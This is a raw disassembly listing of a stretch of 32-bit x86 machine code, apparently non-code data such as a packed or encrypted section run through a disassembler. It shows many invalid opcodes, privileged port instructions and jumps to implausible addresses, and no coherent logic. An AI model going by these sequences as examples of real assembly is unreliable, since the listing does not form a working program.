  40489b:	shl    BYTE PTR [edi-0x72555c13],cl
  4048a1:	xchg   esi,eax
  4048a2:	lea    ebx,[ecx+0x6c]
  4048a5:	and    esi,DWORD PTR [edi]
  4048a7:	lods   eax,DWORD PTR ds:[esi]
  4048a8:	fcom   st(5)
  4048aa:	and    eax,0xd0216c2a
  4048af:	cdq    
  4048b0:	sbb    eax,esp
  4048b2:	inc    ecx
  4048b3:	call   0x8708:0x804ad347
  4048ba:	outs   dx,DWORD PTR ds:[esi]
  4048bb:	mov    ch,bl
  4048bd:	loopne 0x4048aa
  4048bf:	push   ss
  4048c0:	or     esp,DWORD PTR [ecx]
  4048c2:	test   eax,0x3a84cdd1
  4048c7:	push   eax
  4048c8:	dec    edi
  4048c9:	inc    ecx
  4048ca:	and    cl,dh
  4048cc:	lods   eax,DWORD PTR ds:[esi]
  4048cd:	mov    al,ds:0x10b6b469
  4048d2:	(bad)  
  4048d4:	cmc    
  4048d5:	ret    
  4048d6:	shl    DWORD PTR [ecx-0x22c0adc],1
  4048dc:	test   BYTE PTR [ebx],al
  4048de:	add    esp,DWORD PTR [edi+0x65153e49]
  4048e4:	popa   
  4048e5:	xor    DWORD PTR ds:0xc5f9561b,ebx
  4048eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ed:	sti    
  4048ee:	lds    edx,FWORD PTR [eax-0x1d]
  4048f1:	popa   
  4048f2:	dec    ebp
  4048f3:	xor    ch,al
  4048f5:	imul   esi,esp,0xd5280762
  4048fb:	xchg   esp,eax
  4048fc:	jmp    0x6d497543
  404901:	pop    ecx
  404902:	and    edx,DWORD PTR [esi]
  404904:	jno    0x404968
  404906:	jno    0x4048c4
  404908:	push   cs
  404909:	sub    DWORD PTR [edi-0x4fb40507],esi
  40490f:	xor    eax,0x37f8608e
  404914:	mov    dh,0x7
  404916:	and    edx,DWORD PTR [edi]
  404918:	ret    0xbc5c
  40491b:	popf   
  40491c:	icebp  
  40491d:	push   ebp
  40491e:	mov    eax,0xba7d0a57
  404923:	out    dx,eax
  404924:	in     eax,0x1d
  404926:	stos   DWORD PTR es:[edi],eax
  404927:	ret    0x6760
  40492a:	lods   eax,DWORD PTR ds:[esi]
  40492b:	sbb    dl,BYTE PTR [esi+0x791322a6]
  404931:	dec    esp
  404932:	rcl    BYTE PTR [eax+0x1a],1
  404935:	aad    0x99
  404937:	fcmovbe st,st(2)
  404939:	lea    esp,[ecx-0x274fec0e]
  40493f:	mov    DWORD PTR [esi-0x5a22c3fb],eax
  404945:	push   ecx
  404946:	popa   
  404947:	jae    0x404955
  404949:	fisubr WORD PTR es:[edi-0xc7e4f22]
  404950:	neg    ebp
  404952:	pop    es
  404953:	shl    ebp,0xfb
  404956:	push   ebp
  404957:	xor    al,0xe8
  404959:	dec    edi
  40495a:	aad    0xc6
  40495c:	pop    ebp
  40495d:	or     al,BYTE PTR [ecx+edi*2+0x6d]
  404961:	jle    0x404977
  404963:	icebp  
  404964:	or     eax,0xb4ed9425
  404969:	jg     0x40497c
  40496b:	dec    eax
  40496c:	lods   eax,DWORD PTR ds:[esi]
  40496d:	mov    esp,0xf524fa2
  404972:	mov    eax,0xb2b5635
  404977:	pusha  
  404978:	inc    esp
  404979:	jl     0x4049be
  40497b:	ins    DWORD PTR es:[edi],dx
  40497c:	dec    esi
  40497d:	xchg   edx,eax
  40497e:	ja     0x40494f
  404980:	mov    edi,0xe03f445f
  404985:	pop    edi
  404986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404987:	lods   al,BYTE PTR ds:[esi]
  404988:	(bad)  
  404989:	mov    esi,0x7e504209
  40498e:	add    eax,0xbcc7da26
  404993:	into   
  404994:	les    edi,FWORD PTR [edx]
  404996:	popa   
  404997:	inc    eax
  404998:	push   edi
  404999:	out    0x4c,eax
  40499b:	inc    ecx
  40499c:	mov    edx,0xedcb9fe8
  4049a1:	inc    eax
  4049a2:	mov    gs,edx
  4049a4:	in     eax,0x19
  4049a6:	ret    0xe89c
  4049a9:	mov    ebp,0xac4c82af
  4049ae:	(bad)  
  4049af:	iret   
  4049b0:	(bad)  
  4049b1:	inc    DWORD PTR [ebx]
  4049b3:	push   es
  4049b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b5:	mov    esp,0x739c62b0
  4049ba:	in     al,0x96
  4049bc:	pop    ebp
  4049bd:	mov    ds:0x7c2855a3,al
  4049c2:	mov    eax,ds:0x447a5918
  4049c7:	adc    ecx,DWORD PTR [eax-0x27]
  4049ca:	sub    al,0x5f
  4049cc:	ins    BYTE PTR es:[edi],dx
  4049cd:	add    BYTE PTR [esi-0x69],al
  4049d0:	jae    0x40498b
  4049d2:	cmc    
  4049d3:	bound  edi,QWORD PTR [ecx+0x76]
  4049d6:	lods   eax,DWORD PTR ds:[esi]
  4049d7:	mov    bl,bh
  4049d9:	ficomp WORD PTR [eax]
  4049db:	pop    esp
  4049dc:	stc    
  4049dd:	adc    edx,DWORD PTR [esi]
  4049df:	push   ss
  4049e0:	and    esi,DWORD PTR [edi]
  4049e2:	daa    
  4049e3:	fldenv [edi+0x76]
  4049e6:	(bad)  
  4049e7:	les    ebp,FWORD PTR [esi]
  4049e9:	cs imul esi,esi,0xa962e8c9
  4049f0:	ins    BYTE PTR es:[edi],dx
  4049f1:	into   
  4049f2:	stc    
  4049f3:	adc    al,0x77
  4049f5:	sbb    eax,0x46a78a86
  4049fa:	popf   
  4049fb:	xlat   BYTE PTR ds:[ebx]
  4049fc:	adc    BYTE PTR ds:0xa899ab3f,dl
  404a02:	lds    ebp,FWORD PTR [ebp+0x50e4610e]
  404a08:	out    0x36,al
  404a0a:	or     ch,0x12
  404a0d:	(bad)  
  404a0e:	cmp    ch,BYTE PTR [ebx-0x75]
  404a11:	popf   
  404a12:	or     BYTE PTR [esi+0x4a],cl
  404a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a16:	stc    
  404a17:	jmp    0x4049de
  404a19:	retf   0xe081
  404a1c:	data16 jns 0x404a40
  404a1f:	inc    ebx
  404a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a22:	arpl   WORD PTR [eax-0x77],bx
  404a25:	push   ebx
  404a26:	addr16 jle 0x404a70
  404a29:	test   eax,0x643ff005
  404a2e:	sar    DWORD PTR fs:[eax+0xb],cl
  404a32:	jmp    0x8c6:0xab576a0d
  404a39:	into   
  404a3a:	fxch   st(4)
  404a3c:	mov    esp,0x36353d25
  404a41:	mov    WORD PTR [ebx-0x74a96643],?
  404a47:	mov    al,0x26
  404a49:	or     eax,0x2f6b27b6
  404a4e:	mov    ecx,ecx
  404a50:	(bad)  
  404a51:	ror    BYTE PTR [esi+0x61a88ea9],1
  404a57:	pop    ecx
  404a58:	xor    DWORD PTR [edi],edi
  404a5a:	adc    eax,0xe23e3a58
  404a5f:	cwde   
  404a60:	xchg   ebx,eax
  404a61:	dec    esi
  404a62:	arpl   WORD PTR [esi-0x70],sp
  404a65:	test   al,0xa0
  404a67:	inc    ecx
  404a68:	loopne 0x404aa9
  404a6a:	dec    eax
  404a6b:	push   ecx
  404a6c:	mov    ebp,DWORD PTR [ecx]
  404a6e:	jnp    0x404ae7
  404a70:	int3   
  404a71:	iret   
  404a72:	cld    
  404a73:	popf   
  404a74:	mov    ds:0x33f286c,al
  404a79:	aam    0xb8
  404a7b:	mov    dl,0xeb
  404a7d:	xlat   BYTE PTR ds:[ebx]
  404a7e:	out    dx,eax
  404a7f:	mov    dh,0x8d
  404a81:	test   DWORD PTR [ebx+0x36],eax
  404a84:	leave  
  404a85:	jge    0x404a24
  404a87:	scas   eax,DWORD PTR es:[edi]
  404a88:	push   ecx
  404a89:	rcr    BYTE PTR [ebx+0x3281e41e],1
  404a8f:	div    DWORD PTR [edx+0x7d]
  404a92:	inc    BYTE PTR [ebp+0x97d0ba7]
  404a98:	(bad)  
  404a9a:	push   esp
  404a9b:	rcl    ah,1
  404a9d:	mov    eax,ds:0xf0b0b0c8
  404aa2:	es out dx,al
  404aa4:	ins    DWORD PTR es:[edi],dx
  404aa5:	shl    BYTE PTR [esi+0x4e15169],1
  404aab:	mov    esp,0xa182cc1a
  404ab0:	imul   edx,DWORD PTR [esi+eiz*4-0x2d],0xa1a418ff
  404ab8:	js     0x404ab9
  404aba:	add    edx,DWORD PTR [ebp+esi*4-0x44]
  404abe:	adc    BYTE PTR [ecx],0x21
  404ac1:	std    
  404ac2:	push   edx
  404ac3:	inc    edi
  404ac4:	hlt    
  404ac5:	jno    0x404af7
  404ac7:	js     0x404b07
  404ac9:	cld    
  404aca:	je     0x404b0a
  404acc:	popf   
  404acd:	xchg   ecx,ebp
  404acf:	mov    edx,0xfe2b4188
  404ad4:	xlat   BYTE PTR ds:[ebx]
  404ad5:	call   0xaae93fa9
  404ada:	push   esp
  404adb:	es loope 0x404a99
  404ade:	xchg   esp,eax
  404adf:	add    DWORD PTR [edi],edx
  404ae1:	inc    ebp
  404ae2:	pop    es
  404ae3:	jecxz  0x404a85
  404ae5:	xor    eax,0xae05940f
  404aea:	mov    ds:0x62f465d9,al
  404aef:	add    al,0x4e
  404af1:	pusha  
  404af2:	pop    ebp
  404af3:	pop    eax
  404af4:	addr16 (bad) 
  404af6:	push   ds
  404af7:	ins    BYTE PTR es:[edi],dx
  404af8:	lahf   
  404af9:	xchg   ebx,eax
  404afa:	out    dx,al
  404afb:	(bad)  [edx-0xc38b7fa]
  404b01:	fst    DWORD PTR [edx]
  404b03:	test   DWORD PTR [edx+0x60],ebx
  404b06:	jge    0x404ad9
  404b08:	sbb    ebp,DWORD PTR [edx+0x66]
  404b0b:	or     ch,cl
  404b0d:	pop    esi
  404b0e:	sbb    ebp,DWORD PTR [eax]
  404b10:	jbe    0x404b34
  404b12:	dec    ecx
  404b13:	cmp    ebx,0xbb9ff7a1
  404b19:	fdivr  QWORD PTR [ebx+0x15]
  404b1c:	cmp    esp,ebx
  404b1e:	pop    edx
  404b1f:	dec    esp
  404b20:	rcr    DWORD PTR [edi+ebp*2],cl
  404b23:	jne    0x404ad2
  404b25:	mul    eax
  404b27:	xlat   BYTE PTR ds:[ebx]
  404b28:	inc    edi
  404b29:	or     BYTE PTR [ecx-0x5e4293b8],al
  404b2f:	ins    BYTE PTR es:[edi],dx
  404b30:	fisubr DWORD PTR [ebx-0x1fcc71c6]
  404b36:	push   edi
  404b37:	push   0x993f9805
  404b3c:	mov    BYTE PTR [esp+eax*4+0x3f9b0004],al
  404b43:	(bad)  
  404b44:	leave  
  404b45:	xor    eax,0x16253d26
  404b4a:	dec    edx
  404b4b:	pushf  
  404b4c:	mov    ebx,DWORD PTR [ebx-0x34b5a4d1]
  404b52:	dec    ecx
  404b53:	js     0x404b97
  404b55:	or     esp,DWORD PTR [edx+0x45a76aed]
  404b5b:	jp     0x404b9c
  404b5d:	pusha  
  404b5e:	mov    cl,0x1e
  404b60:	adc    eax,0x22fb758f
  404b65:	xchg   ebx,eax
  404b66:	xchg   BYTE PTR [edx+0x7],dh
  404b69:	enter  0xfc87,0x29
  404b6d:	xor    bh,BYTE PTR [eax+0x4]
  404b70:	shr    BYTE PTR ds:0xad087759,0x6b
  404b77:	mov    eax,0xe23501f2
  404b7c:	outs   dx,DWORD PTR ds:[esi]
  404b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b7e:	jnp    0x404b38
  404b80:	cdq    
  404b81:	lods   eax,DWORD PTR ds:[esi]
  404b82:	inc    ecx
  404b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b84:	stos   DWORD PTR es:[edi],eax
  404b85:	cli    
  404b86:	stos   BYTE PTR es:[edi],al
  404b87:	(bad)  
  404b88:	(bad)  
  404b89:	adc    BYTE PTR [esi-0x76ff83c9],dl
  404b8f:	or     eax,0x933bc15c
  404b94:	jge    0x404b8c
  404b96:	in     eax,dx
  404b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b98:	neg    DWORD PTR ds:0x87116cd9
  404b9e:	xchg   edx,eax
  404b9f:	and    al,0x9f
  404ba1:	in     eax,dx
  404ba2:	test   eax,0xc5fda2e5
  404ba7:	(bad)  
  404ba8:	call   0xbb71f3f0
  404bad:	jno    0x404bda
  404baf:	scas   al,BYTE PTR es:[edi]
  404bb0:	fidiv  DWORD PTR [ebx]
  404bb2:	xchg   edi,eax
  404bb3:	retf   0x20f9
  404bb6:	outs   dx,BYTE PTR ds:[esi]
  404bb7:	mov    bl,0x81
  404bb9:	fs sbb eax,0xc64c9224
  404bbf:	int    0xaa
  404bc1:	push   edi
  404bc2:	jg     0x404c3f
  404bc4:	or     al,0xb8
  404bc6:	and    BYTE PTR [edx+0xb],cl
  404bc9:	mov    ds:0xb30524d8,al
  404bce:	test   BYTE PTR [edi+0x3a27ead0],0xf2
  404bd5:	pop    ebp
  404bd6:	ja     0x404c53
  404bd8:	xor    eax,edx
  404bda:	pop    ds
  404bdb:	gs jecxz 0x404b96
  404bde:	dec    ebp
  404bdf:	mov    dh,0xd5
  404be1:	retf   0xaada
  404be4:	mov    esi,cs
  404be6:	std    
  404be7:	punpckhwd mm1,QWORD PTR [ebp+0x1e]
  404beb:	rcr    DWORD PTR es:[esp+edx*1],1
  404bef:	(bad)  
  404bf0:	jae    0x404c3e
  404bf2:	fidiv  WORD PTR [edx]
  404bf4:	into   
  404bf5:	sub    al,0xf2
  404bf7:	push   0xcd8d8fb6
  404bfc:	xor    DWORD PTR [eax+0x36],esp
  404bff:	test   BYTE PTR [edx-0x6859e776],bl
  404c05:	and    al,0x79
  404c07:	xor    ecx,edx
  404c09:	mov    edi,0xe4a95b28
  404c0e:	push   esp
  404c0f:	loope  0x404bce
  404c11:	or     eax,esp
  404c13:	sbb    dh,BYTE PTR ds:0x7e5a0430
  404c19:	cmp    ecx,DWORD PTR [ebx+esi*8]
  404c1c:	imul   esi,DWORD PTR [edi],0xfea91464
  404c22:	pop    edx
  404c23:	rdtsc  
  404c25:	sar    BYTE PTR [edx+0x42bbeedd],cl
  404c2b:	push   ecx
  404c2c:	mov    edi,0xc0be3546
  404c31:	mov    eax,0x97252b8b
  404c36:	jmp    0x609e75be
  404c3b:	fldenv [edx+0x1d0a5014]
  404c41:	and    DWORD PTR [eax+ebp*2],esi
  404c44:	mov    al,0x81
  404c46:	sub    al,0x98
  404c48:	xchg   ebp,eax
  404c49:	mov    DWORD PTR [edi],0xcfa280ed
  404c4f:	adc    DWORD PTR [edx],ecx
  404c51:	jmp    0x404bd5
  404c53:	cli    
  404c54:	(bad)  
  404c55:	fist   DWORD PTR [ebp-0x3f56264]
  404c5b:	jne    0x404cd6
  404c5d:	ds xor dl,bh
  404c60:	in     al,0x8b
  404c62:	int    0x9b
  404c64:	cmp    dh,bh
  404c66:	or     esi,DWORD PTR [eax]
  404c68:	fcmove st,st(6)
  404c6a:	in     eax,dx
  404c6b:	cmp    esi,DWORD PTR [esi-0x34]
  404c6e:	fmul   DWORD PTR [ecx]
  404c70:	jge    0x404cf0
  404c72:	pop    ss
  404c73:	jo     0x404cd1
  404c75:	ds mov al,0x7e
  404c78:	icebp  
  404c79:	push   cs
  404c7a:	jnp    0x404c1a
  404c7c:	mov    edi,DWORD PTR [edi]
  404c7e:	sub    ch,BYTE PTR [ecx-0x1b90e4b4]
  404c84:	dec    esp
  404c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c86:	mov    dl,0x23
  404c88:	jge    0x404cd1
  404c8a:	dec    ecx
  404c8b:	and    eax,0x40e9b3c2
  404c90:	ja     0x404c48
  404c92:	test   DWORD PTR [edi-0x3e],ebp
  404c95:	mov    dl,0x65
  404c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c98:	je     0x404c42
  404c9a:	add    eax,esp
  404c9c:	sub    BYTE PTR [eax+0x36],0x28
  404ca0:	repz jmp 0xc8f0:0xbdbcc79e
  404ca8:	mov    WORD PTR [ebx],?
  404caa:	pop    ebx
  404cab:	sub    ebp,DWORD PTR [ecx+0x48]
  404cae:	adc    cl,cl
  404cb0:	fdivr  DWORD PTR [ebp-0x16eee087]
  404cb6:	pushf  
  404cb7:	xlat   BYTE PTR ds:[ebx]
  404cb8:	push   ds
  404cb9:	cmp    eax,0x9b5a4753
  404cbe:	jg     0x404d1a
  404cc0:	aad    0xc3
  404cc2:	or     al,0xb2
  404cc4:	or     al,0x94
  404cc6:	cdq    
  404cc7:	push   eax
  404cc8:	daa    
  404cc9:	in     eax,0xd9
  404ccb:	setbe  BYTE PTR [esp+esi*1-0xe]
  404cd0:	push   ebp
  404cd1:	adc    DWORD PTR [ecx-0x4f620b19],eax
  404cd7:	mov    WORD PTR [esi-0xc05cc19],ds
  404cdd:	push   gs
  404cdf:	mov    al,0x1f
  404ce1:	ja     0x404cf5
  404ce3:	lods   eax,DWORD PTR ds:[esi]
  404ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce5:	addr16 loopne 0x404d66
  404ce8:	mov    esp,DWORD PTR [ebx+0x248e2e5e]
  404cee:	mov    DWORD PTR [eax-0x14],edi
  404cf1:	arpl   WORD PTR [ecx-0x29],bp
  404cf4:	sub    BYTE PTR [ebx],cl
  404cf6:	(bad)  [ebx+esi*1+0x2e]
  404cfa:	and    eax,0xbffe5f9b
  404cff:	mov    BYTE PTR [ebp+0x1f],ah
  404d02:	sub    eax,0xe5ab5338
  404d07:	add    ebx,ebp
  404d09:	add    al,0x3b
  404d0b:	push   es
  404d0c:	shl    DWORD PTR [ebx-0x57],0xf5
  404d10:	push   ecx
  404d11:	ins    BYTE PTR es:[edi],dx
  404d12:	call   0xf1eea804
  404d17:	cmp    DWORD PTR [ebp+0x7f220223],edi
  404d1d:	repnz xchg edx,eax
  404d1f:	add    BYTE PTR [ebp+esi*1-0xac26af8],al
  404d26:	pop    esi
  404d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d28:	imul   ebx,DWORD PTR [edx],0xffffffc9
  404d2b:	(bad)  
  404d2c:	rol    DWORD PTR ds:0x89619eef,0x3a
  404d33:	(bad)  
  404d35:	mov    DWORD PTR [eax-0x55],ebx
  404d38:	cli    
  404d39:	lods   eax,DWORD PTR ds:[esi]
  404d3a:	add    al,0x37
  404d3c:	mov    ch,0x76
  404d3e:	mov    ds:0x2fc743db,al
  404d43:	fisubr DWORD PTR [edi-0x68]
  404d46:	inc    edx
  404d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d48:	cmp    al,0x72
  404d4a:	lods   eax,DWORD PTR ds:[esi]
  404d4b:	mov    ah,0x63
  404d4d:	fwait
  404d4e:	in     eax,dx
  404d4f:	xchg   BYTE PTR [eax-0x26b72913],cl
  404d55:	adc    edi,edx
  404d57:	xchg   BYTE PTR [eax-0x16eda509],ch
  404d5d:	xor    BYTE PTR [eax+0x7e],al
  404d60:	dec    edi
  404d61:	xchg   edx,eax
  404d62:	jae    0x404d8f
  404d64:	ins    DWORD PTR es:[edi],dx
  404d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d66:	lods   eax,DWORD PTR ds:[esi]
  404d67:	sbb    al,0xf5
  404d69:	pop    esi
  404d6a:	push   ds
  404d6b:	out    dx,eax
  404d6c:	inc    eax
  404d6d:	jmp    0x2282b6b2
  404d72:	xchg   edx,eax
  404d73:	dec    ebp
  404d74:	add    eax,0x652441b2
  404d79:	sbb    al,0x4
  404d7b:	out    dx,eax
  404d7c:	jnp    0x404df8
  404d7e:	shr    BYTE PTR [ebp+eiz*1+0x5c],cl
  404d82:	jo     0x404d19
  404d84:	add    al,0x88
  404d86:	fcomi  st,st(6)
  404d88:	push   cs
  404d89:	jl     0x404d12
  404d8b:	jb     0x404db8
  404d8d:	packsswb mm0,QWORD PTR [esi+ecx*8]
  404d91:	in     eax,dx
  404d92:	xor    ah,BYTE PTR [eax+0x56]
  404d95:	adc    edx,ebx
  404d97:	leave  
  404d98:	xor    eax,0xd033d5e1
  404d9d:	push   cs
  404d9e:	stos   DWORD PTR es:[edi],eax
  404d9f:	or     ecx,edi
  404da1:	inc    ebp
  404da2:	icebp  
  404da3:	push   edi
  404da4:	bound  ebp,QWORD PTR [edx-0x65]
  404da7:	cld    
  404da8:	mov    edx,0x29a7776f
  404dad:	shr    ch,0x3a
  404db0:	iret   
  404db1:	pusha  
  404db2:	inc    DWORD PTR [ebp+0x5099eeea]
  404db8:	(bad)  
  404dba:	mov    bl,0xc5
  404dbc:	push   ecx
  404dbd:	rol    BYTE PTR [eax-0x3775a1ba],cl
  404dc3:	stos   DWORD PTR es:[edi],eax
  404dc4:	mov    ss,WORD PTR [ebp+0x32c39c2a]
  404dca:	xor    DWORD PTR [ebp-0x6e4e1b14],edi
  404dd0:	pop    ds
  404dd1:	push   cs
  404dd2:	jb     0x404dc0
  404dd4:	ret    
  404dd5:	(bad)  
  404dd6:	xor    ebp,DWORD PTR [edi]
  404dd8:	sahf   
  404dd9:	(bad)  
  404dda:	sti    
  404ddb:	ss ins BYTE PTR es:[edi],dx
  404ddd:	mov    DWORD PTR [eax-0x59],esp
  404de0:	adc    edi,DWORD PTR [ebx+eax*8]
  404de3:	icebp  
  404de4:	je     0x404d75
  404de6:	sub    dh,dl
  404de8:	std    
  404de9:	mov    edx,0x4261be9a
  404dee:	cld    
  404def:	stos   DWORD PTR es:[edi],eax
  404df0:	mov    bh,0x7b
  404df2:	aad    0xe8
  404df4:	call   0x5139164f
  404df9:	sti    
  404dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dfb:	push   edx
  404dfc:	inc    esi
  404dfd:	and    BYTE PTR [ebp+0x7b3fc2fb],dh
  404e03:	sbb    al,0x91
  404e05:	into   
  404e06:	pop    edx
  404e07:	pop    ebp
  404e08:	mul    eax
  404e0a:	mov    edx,0xb35c89de
  404e0f:	stos   DWORD PTR es:[edi],eax
  404e10:	mov    BYTE PTR ds:[edx+0x1b],dh
  404e14:	sbb    eax,0x43d306d8
  404e19:	icebp  
  404e1a:	jb     0x404dbf
  404e1c:	ror    ch,0x83
  404e1f:	ss inc ecx
  404e21:	repz test al,0xf
  404e24:	mov    esi,0xcf56d497
  404e29:	xor    edi,DWORD PTR [ebp-0xc]
  404e2c:	jae    0x404e16
  404e2e:	dec    edx
  404e2f:	mov    edi,ebx
  404e31:	sete   BYTE PTR [ebx+0x9518af1]
  404e38:	ret    0x4c83
  404e3b:	scas   al,BYTE PTR es:[edi]
  404e3c:	fild   QWORD PTR [ebp+eax*2+0x2e]
  404e40:	sbb    al,BYTE PTR [edi]
  404e42:	push   esp
  404e43:	aad    0x1c
  404e45:	cwde   
  404e46:	aad    0x6a
  404e48:	xlat   BYTE PTR ds:[ebx]
  404e49:	jl     0x404e1a
  404e4b:	cdq    
  404e4c:	aam    0xed
  404e4e:	cmp    cl,BYTE PTR [ecx]
  404e50:	aam    0xbc
  404e52:	es das 
  404e54:	pop    ss
  404e55:	jns    0x404e59
  404e57:	aam    0x3d
  404e59:	jle    0x404ec4
  404e5b:	dec    esi
  404e5c:	loope  0x404e2d
  404e5e:	add    esp,ecx
  404e60:	xor    ebp,ebp
  404e62:	call   0x95d0:0x54373544
  404e69:	fsub   QWORD PTR [edi-0x1984d2be]
  404e6f:	(bad)  
  404e70:	pop    eax
  404e71:	push   edx
  404e72:	iret   
  404e73:	sub    dl,al
  404e75:	mov    ecx,fs
  404e77:	loopne 0x404e78
  404e79:	xchg   ebp,eax
  404e7a:	jbe    0x404ec5
  404e7c:	mov    dl,0xde
  404e7e:	sbb    BYTE PTR [ebp-0x1f],al
  404e81:	out    dx,eax
  404e82:	xchg   edi,eax
  404e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e84:	push   esp
  404e85:	and    ebx,DWORD PTR [edi+0x506605c2]
  404e8b:	test   BYTE PTR [esp+ebp*1],0x33
  404e8f:	mov    BYTE PTR ds:[eax+0x66],al
  404e93:	fwait
  404e94:	adc    al,0x29
  404e96:	ins    DWORD PTR es:[edi],dx
  404e97:	xchg   esp,eax
  404e98:	mov    esp,0xd813595
  404e9d:	dec    DWORD PTR [esi-0x51]
  404ea0:	xchg   esp,eax
  404ea1:	aad    0xda
  404ea3:	aas    
  404ea4:	and    BYTE PTR [ecx-0x6da53428],ah
  404eaa:	push   esi
  404eab:	adc    DWORD PTR [edx],esi
  404ead:	fstp   QWORD PTR [edi+0x29]
  404eb0:	pop    ebp
  404eb1:	icebp  
  404eb2:	add    ch,cl
  404eb4:	in     eax,0x70
  404eb6:	in     al,0x70
  404eb8:	mov    gs,WORD PTR [eax]
  404eba:	out    dx,eax
  404ebb:	fld1   
  404ebd:	les    ebp,FWORD PTR [edi+eax*4+0x65]
  404ec1:	sbb    al,0xc7
  404ec3:	sahf   
  404ec4:	jl     0x404ecc
  404ec6:	imul   eax,DWORD PTR [edi],0xf1d9d01b
  404ecc:	jbe    0x404ed6
  404ece:	fs icebp 
  404ed0:	pusha  
  404ed1:	inc    eax
  404ed2:	push   edi
  404ed3:	xlat   BYTE PTR ds:[ebx]
  404ed4:	push   es
  404ed5:	inc    edx
  404ed6:	adc    ebx,DWORD PTR [eax]
  404ed8:	outs   dx,BYTE PTR ds:[esi]
  404ed9:	dec    eax
  404eda:	dec    esi
  404edb:	in     al,0x96
  404edd:	mov    ebx,0x8cc3b2d2
  404ee2:	xchg   edx,eax
  404ee3:	inc    ecx
  404ee4:	out    dx,eax
  404ee5:	and    al,0x71
  404ee7:	mov    eax,ds:0x48404eaf
  404eec:	mov    eax,0x68c1f573
  404ef1:	es dec ebp
  404ef3:	fidiv  DWORD PTR [ecx-0x2ad30fdf]
  404ef9:	and    eax,0x1d9e4d1a
  404efe:	pop    edx
  404eff:	or     edx,DWORD PTR [eax+0xce1210]
  404f05:	pop    esp
  404f06:	pop    edx
  404f07:	adc    al,BYTE PTR [edx]
  404f09:	das    
  404f0a:	iret   
  404f0b:	call   0xa0fb:0x3d8a10e
  404f12:	xchg   edx,eax
  404f13:	or     eax,0x6ba4ade
  404f18:	retf   
  404f19:	in     al,0x4
  404f1b:	add    eax,0x611af20a
  404f20:	xor    BYTE PTR [edi+eiz*1-0xfa33fa2],dh
  404f27:	mov    al,ds:0xe18b03ea
  404f2c:	inc    ebp
  404f2d:	jns    0x404edc
  404f2f:	repnz push es
  404f31:	(bad)  
  404f32:	retf   0x92f0
  404f35:	cmp    BYTE PTR ds:0xb9ecbef1,0x18
  404f3c:	in     eax,0x1e
  404f3e:	add    dl,BYTE PTR [ecx]
  404f40:	cdq    
  404f41:	stos   BYTE PTR es:[edi],al
  404f42:	sbb    BYTE PTR [eax],0x4
  404f45:	aad    0x1e
  404f47:	cmp    al,0xcd
  404f49:	xchg   esp,eax
  404f4a:	jmp    0xf968:0xc2374374
  404f51:	xlat   BYTE PTR ds:[ebx]
  404f52:	call   0x14c47a24
  404f57:	sahf   
  404f58:	dec    ebp
  404f59:	loope  0x404f6b
  404f5b:	scas   eax,DWORD PTR es:[edi]
  404f5c:	adc    al,0x8f
  404f5e:	sti    
  404f5f:	aas    
  404f60:	out    0x1b,al
  404f62:	jp     0x404f51
  404f64:	cmp    eax,0xe8c0cfea
  404f69:	pop    ds
  404f6a:	push   ds
  404f6b:	mov    esi,0xbaed7603
  404f70:	gs cli 
  404f72:	mov    ds:0xacddcab5,eax
  404f77:	lahf   
  404f78:	cli    
  404f79:	sbb    ebx,ebp
  404f7b:	sbb    dl,BYTE PTR ss:[ecx+0x59]
  404f7f:	jmp    0xab53d2ae
  404f84:	adc    al,0x7e
  404f86:	leave  
  404f87:	jge    0x404f1b
  404f89:	mov    ds:0x2d5713d0,al
  404f8e:	push   0x19
  404f90:	or     DWORD PTR [edi+0x52],ebx
  404f93:	(bad)  
  404f94:	lahf   
  404f95:	add    eax,0x2c0564fa
  404f9a:	cmovb  ebx,edx
  404f9d:	push   eax
  404f9e:	out    0x7a,al
  404fa0:	xchg   esi,eax
  404fa1:	push   ecx
  404fa2:	outs   dx,BYTE PTR ds:[esi]
  404fa3:	pop    eax
  404fa4:	jmp    0x2e1d40c2
  404fa9:	scas   al,BYTE PTR es:[edi]
  404faa:	rcl    ebx,0x44
  404fad:	ds daa 
  404faf:	dec    edi
  404fb0:	aaa    
  404fb1:	test   eax,0x2a22206c
  404fb6:	xor    ecx,DWORD PTR [ebp+0x47]
  404fb9:	ror    bh,cl
  404fbb:	scas   eax,DWORD PTR es:[edi]
  404fbc:	cmp    eax,0xccdce9cc
  404fc1:	mov    bh,0xd3
  404fc3:	sbb    DWORD PTR [esi-0x8],ecx
  404fc6:	aam    0xe8
  404fc8:	aad    0x33
  404fca:	push   ds
  404fcb:	push   ecx
  404fcc:	add    bl,0xef
  404fcf:	(bad)  
  404fd0:	popf   
  404fd1:	cwde   
  404fd2:	xor    DWORD PTR [edi+0x2c],esp
  404fd5:	std    
  404fd6:	mov    bh,0xc6
  404fd8:	popa   
  404fd9:	or     al,BYTE PTR [edi+0xfe1427]
  404fdf:	das    
  404fe0:	and    bh,BYTE PTR [esi]
  404fe2:	jp     0x404f8f
  404fe4:	add    DWORD PTR [esi],edi
  404fe6:	lds    esi,FWORD PTR [eax+0x35d43e25]
  404fec:	iret   
  404fed:	push   ebx
  404fee:	inc    esp
  404fef:	retf   0x901d
  404ff2:	and    bl,BYTE PTR [ebx+eax*1+0x7022519c]
  404ff9:	push   0x3f6179e3
  404ffe:	push   0x3c2af7b1
  405003:	fcmovne st,st(7)
  405005:	scas   al,BYTE PTR es:[edi]
  405006:	push   ebp
  405007:	inc    eax
